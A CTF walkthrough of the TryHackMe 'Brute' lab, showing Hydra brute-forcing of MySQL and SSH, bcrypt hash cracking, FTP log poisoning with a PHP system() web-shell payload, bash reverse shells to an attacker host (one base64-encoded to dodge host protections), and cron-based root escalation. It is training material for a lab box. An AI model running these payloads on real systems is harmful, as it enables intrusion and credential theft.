+++
title = "THM: Brute -- Write-Up"
description = "Walkthrough write-up of the TryHackMe Brute CTF"
type = ["posts","post"]
tags = [
    "nmap",
    "mysql",
    "mariadb",
    "johntheripper",
    "logpoisoning",
    "cronjob"
]
date = "2022-09-22T11:15:00"
categories = [
    "ctf",
    "TryHackMe",
]
[ author ]
  name = "Rob"
+++

## About 
Brute is a *medium* rated CTF room on [TryHackMe](https://tryhackme.com/room/ettubrute). Rooting this box - which centers around brute-force attacks, as its name implies - involves carrying out a successful dictionary attacks, database enumeration, log poisoning, hash cracking, and cronjob-based privilege escalation.

**Note:** I have replaced all instances of the virtual machine's ip address with `<target-ip>` throughout this write-up.

## Enumeration
### nmap

```
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3

22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

3306/tcp open  mysql   syn-ack ttl 61 MySQL 8.0.28-0ubuntu0.20.04.3

[*] Identified service nl-voice on tcp/1259 on <target-ip>
```
Our initial nmap efforts reveal standard `vsftp`(port 21) and `OpenSSH` (port 22), and MySQL (port 3306) services running on the box. Additionally, our scans picked up activity on port 1259, which was tagged as `nl-voice`. This may be worth returning to later, if we need additional leads.

### MySQL - Port 3306
`http://<target-ip>:3306/`
```
[���
8.0.28-0ubuntu0.20.04.3�Ñ:��{Q;  nLG�ÿÿÿ �ÿß ����������uqZW
O6[]707�caching_sha2_password�!�� ÿ„ #08S01Got packets out of order
```

Visiting the MySQL server port in our browser returns the above. This intial enumeration could also have been achieved via tools like netcat. We note that the contents of the  message displayed match nmap's service version identification of `MySQL 8.0.28-0ubuntu0.20.04.3`.

## Exploitation
While we haven't come across any immediate evidence to confirm this, our CTF experience and instincts tell us that it will be worth our while to attempt logging in with default and/or commonly used credentials. [MySQL's default user configuration](https://dev.mysql.com/doc/refman/8.0/en/default-privileges.html) uses `root` as the username, with no password. While we aren't quite *that* lucky, our initial brute-force efforts yield the correct password.

### Hydra
`hydra -f -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt <target-ip>mysql`
```
$ hydra -f -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt <target-ip>mysql | sudo tee hydra-mysql.txt
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-03 13:01:07
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.10.46.5:3306/
[ATTEMPT] target <target-ip>- login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "iloveyou" - 5 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "princess" - 6 of 14344399 [child 0] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "1234567" - 7 of 14344399 [child 2] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "r-----u" - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "12345678" - 9 of 14344399 [child 1] (0/0)
[ATTEMPT] target <target-ip>- login "root" - pass "abc123" - 10 of 14344399 [child 0] (0/0)
[3306][mysql] host: <target-ip>👍  login: root   password: r-----u👍
[STATUS] attack finished for <target-ip>(valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-03 13:01:10

```

## Enumeration - MySQL
Now that we have valid credentials for accessing the MySQL database, let's see what we can find...

### MySQL
`mysql -h <target-ip>-u root -p `
```
$ mysql -h <target-ip>-u root -p
Enter password: r-----u

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 31
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.098 sec)

```

`use website;`
```
MySQL [(none)]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

`show tables;`
```
MySQL [website]> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.090 sec)
```

`select * from users;`
```


MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.096 sec)

```
Excellent! We've found some user credentials, including a hashed password -`adrian:$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we`. Let's try to crack it with John the Ripper.

### John the Ripper
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt adrian_hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
👍t----r           (?)     👍
1g 0:00:00:00 DONE (2022-08-03 13:06) 4.166g/s 150.0p/s 150.0c/s 150.0C/s 123456..jordan
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Our friend John made short work of this, despite Blowfish being a relatively uncommon cipher (having been largely eclipsed by AES - more information [here](https://en.wikipedia.org/wiki/Blowfish_(cipher)).)

`adrian:t----r`

### Web login

After logging in to the homepage with our discovered credentials...

`http://10.10.46.5/welcome.php`
![](/images/brutus/brutus-welcome.png)

We are greeted by this page. The `log` button gives us convenient access to a service log right on the page. After some brief consideration, we identify this log as being produced by the FTP server running on port 21 of the box. Our initial attempts at enumeration/access have already populated the log!

`view-source:http://<target-ip>/welcome.php`
```
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <h1 class="my-5">Welcome back adrian, Your log file is ready for viewing.</h1>
    Wed Aug  3 17:11:34 2022 [pid 1426] CONNECT: Client "::ffff:<attacker-ip>"
Wed Aug  3 17:11:38 2022 [pid 1425] [virtualtack] FAIL LOGIN: Client "::ffff:<attacker-ip>"
Wed Aug  3 17:11:46 2022 [pid 1466] CONNECT: Client "::ffff:<attacker-ip>"
Wed Aug  3 17:11:53 2022 [pid 1465] [adrian] FAIL LOGIN: Client "::ffff:<attacker-ip>"
<br>    <br> 
    <form action="" method="post">
        <input type="submit" name="log" value="Log">	
    </form>
    <br>
    <p> 
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
    </p>
</body>
</html>
```

My first instinct here is to try some log poisioning. Here are the steps that I used to successfully realize the attack:

**1.Capture the log request using Burp Suite**
![](/images/brute/burprepeater.png)


**2. Inject PHP system request code**
We can do this easily via log-in attempts, simply replacing our username in the request with a PHP system request (`<?php echo system($_REQUEST['loljection']); ?>`).

```
$ ftp <target-ip>
Connected to <target-ip>.
220 (vsFTPd 3.0.3)
Name (<target-ip>:virtualtack): beep boop <?php echo system($_REQUEST['loljection']); ?> beep boop
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

This will create a new entry in the log, allowing us to make an HTTP request via Burp with a system command in the format of `loljection=<command>`. The output of our command arguments can then be viewed:

![](/images/brute/rcewin.png)

## Foothold
Now that we have a PoC of the log poisoning vector, we can set up our netcat listener - `nc -lvnp <port>` - and execute our remote shell command (`bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' `) via HTTP request.

```
✂️ ................................ ✂️

log=Log&loljection=bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' 
```
❗**Note:** Before sending this request via Burp, we need to `URL Encode` it by highlighting the bash command and pressing  `CTRL+U`.

...and we get a reverse shell for our efforts.

```
$ sudo nc -l 9002
bash: cannot set terminal process group (784): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ whoami
whoami
www-data
www-data@brute:/var/www/html$
```

This gives us access to the machine as the `www-data` account. After a moment spent upgrading our shell, we can move on.

## Enumeration
Now that we have remote access, let's take a look around...

Since our on-ramp was a web app, let's check out `/var/www/`...

`config.php`
```
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d789!');
define('DB_NAME', 'website');

/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
    die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>
```

Unfortunately the credentials here don't appear to be reused elsewhere, which I hoped would give us access to `adrian`'s user account on the machine. However, if we need an additional escalation vector later, these MySQL database credentials may be useful. For now, though, let's move on to the `/home/` directory.

`/home/adrian/.reminder`
```
www-data@brute:/home/adrian$ cat .reminder

Rules:
best of 64
+ exclamation

ettubrute
```
Luckily we have access to `adrian`'s home folder as `www-user`. Inside, we find a hidden file called `.reminder` with some hints on how to proceed.


## PrivEsc

### As user `www-data`...
When searching the internet for "rules AND best of 64", the first result points to `best64.rule` on the Hashcat GitHub repository. I happen to be more familiar with John the Ripper to create custom wordlists, so I'll be using that instead. We will create a new wordlist, using the `best of 64` rule in conjuction with our password hint `ettubrute`.

**Create 'Best of 64' password list with John**
```
john --rules=best64 --wordlist=password.txt --stdout > wordlist.txt
```

Now we have `wordlist.txt`, which uses our `best of 64` rule to mangle `ettubrute`, but we need to account for the `+ exclamation` line of our hint. While we could manually add a `!` to the end of each entry in our list, we can do it properly with the `sed` command [for the sake of learning](https://stackoverflow.com/questions/15978504/add-text-at-the-end-of-each-line).

**Add `!` to end of wordlist entries**
```
sed -i 's/$/!/' wordlist.txt
```

Now our wordlist accounts for both hints. It looks like:
```
$ cat wordlist.txt
ettubrute!
eturbutte!
ETTUBRUTE!
Ettubrute!
ettubrute0!
ettubrute1!
ettubrute2!
ettubrute3!
✂️ ................................ ✂️
```

Now we should be able use this wordlist to crack the SSH password of the `adrian` user via Hydra.

```
hydra -f -V -l adrian -P wordlist.txt -e nsr -s 22 ssh://<target-ip>
```

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 16:28:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 78 login tries (l:1/p:78), ~5 tries per task
[DATA] attacking ssh://<target-ip>:22/
[ATTEMPT] target <target-ip> - login "adrian" - pass "adrian" - 1 of 78 [child 0] (0/0)
✂️ ................................ ✂️
[ATTEMPT] target <target-ip> - login "adrian" - pass "t-----------!" - 45 of 80 [child 1] (0/2)
[22][ssh] host: <target-ip>   login: adrian   password: t-----------!
[STATUS] attack finished for <target-ip> (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 16:28:50
```
Excelllent. We now have valid user account credentials for SSH access:
`adrian:t-----------!`

### As user `adrian`...
Exploring the user's home directory, we come across another hint, as well as two bash script (`.sh`) files.

`~/ftp/files/.notes`
```
That silly admin
He is such a micro manager, wants me to check in every minute by writing on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.
```

`~/ftp/files/script`
```
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

`~/punch_in.sh`
```
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

Looking for a quick win, I began adding reverse shell code to various locations in the script file(s). This yielded very little, though I was able to initiate a reverse shell callback as the `adrian` user via `~/ftp/files/script`. From this, we know that our attacking machine is reachable, and that there are no prohibitive antivirus to account for.

From the `.notes` hint, we know/can assume that `punch_in.sh` is being run by the `root` user (e.g., the author's boss). If this is true, the script is pulling each line from `punch_in`, and running the line as a shell command (`/usr/bin/sh -c <line-here>`). 

Thus, if my hypothesis is correct, we can effectively run commands as `root` by passing them into the scheduled `punch_in.sh` via `punch_in`. This means that we have a few routes to `root` (🙃). I highlight two below:

### Method 1 - Setting the SUID Bit
The easiest and most direct route to `root` escalation is by adding the SUID bit to the machine's `bash` binary, allowing it to be run by all users with elevated permissions.

This can be done by adding a line containing `` `chmod +s /bin/bash` `` to `punch_in`. When the `punch_in.sh` script runs and ingests our command to execute, we will gain the ability to run `bash` as `root`.

❗**Note:** Commands placed in `punch_in` must be wrapped in backticks (`` ` ` ``) for the script to interpret it correctly.

As shown on [GTFOBins](https://gtfobins.github.io/gtfobins/bash/), with the SUID bit set, `bash` simply needs to be run with the `-p` flag to invoke/preserve elevated permissions.

```
adrian@brute:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{C-------------------------3}
```

### Method 2 - Reverse Shell
Alternatively, we can spawn a reverse shell on our attacking machine by injecting the relevant reverse shell code. I chose to use a base64 encoded command, as it can potentially sidestep host-based protections and other pitfalls with little intial time investment. 

**Bash reverse shell**
```
/bin/bash -i >& /dev/tcp/<attacker-ip>/9111 0>&1
```

**Base64 encoded/decoded bash reverse shell**
```
`echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL215dGhtaXAvOTExMSAwPiYx+JjE=" | base64 -d | bash`
```

```
$ nc -lvnp 9111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9111
Ncat: Listening on 0.0.0.0:9111
Ncat: Connection from <target-ip>.
Ncat: Connection from <target-ip>:59158.
bash: cannot set terminal process group (3423): Inappropriate ioctl for device
bash: no job control in this shell
root@brute:~# whoami
whoami
root
root@brute:~# cat /root/root.txt
cat /root/root.txt
THM{C-------------------------3}
```

## Lessons Learned
This was a really enjoyable box, with several opportunities to practice and refine my methodology.

* **FTP log poisoning** - while we didn't have to hunt down a service log file via LFI or another web-app-based vector, this box helped me to expand my understanding and methodology. This was one of the first log poisoning vectors I have encountered related to an FTP service, instead of Apache, as is frequently the case.
* **Password mangling with Rules (John)** - this box provided a great refresher on the generation of (password) wordlists via Hashcat/John/etc. rulesets.  
* **Encoding** and **"best practices"** - After completing the box, I went back to check if the reverse shell code would execute absent base64 encoding. I couldn't get it to. Thus, this box provided solid reinforcement of best practices in my developing methodology, as encoding the code "cost" me little (in terms of time) but yielded a successful privilege escalation.